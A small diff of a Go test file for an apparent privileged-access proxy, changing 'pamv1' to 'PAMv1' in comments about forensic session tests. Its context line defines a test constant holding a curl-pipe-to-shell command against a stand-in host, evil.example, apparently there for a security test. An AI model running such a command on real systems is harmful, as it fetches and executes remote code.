@@ -32,7 +32,7 @@ const hiddenCommand = "curl -s http://evil.example/payload | sh"
 // like the other proxy tests' upstream, and additionally answers the ONE fixed
 // forensic command with a fixture ausearch record — standing in for a target
 // running auditd. It records every exec it was asked to run, so a test can
-// assert what pamv1 sent.
+// assert what PAMv1 sent.
 type forensicUpstream struct {
 	host string
 	port int
@@ -172,7 +172,7 @@ func auditFixture(now time.Time) string {
 }
 
 // startForensicProxy wires a proxy whose post-session hook records what it was
-// handed, so a test can assert the window and identity pamv1 reports.
+// handed, so a test can assert the window and identity PAMv1 reports.
 func startForensicProxy(t *testing.T, st store.Store, v *vault.Vault, hook func(proxy.SessionForensics)) string {
 	t.Helper()
 	resolver, err := auth.NewResolver(st, proxyAPIKey, "")
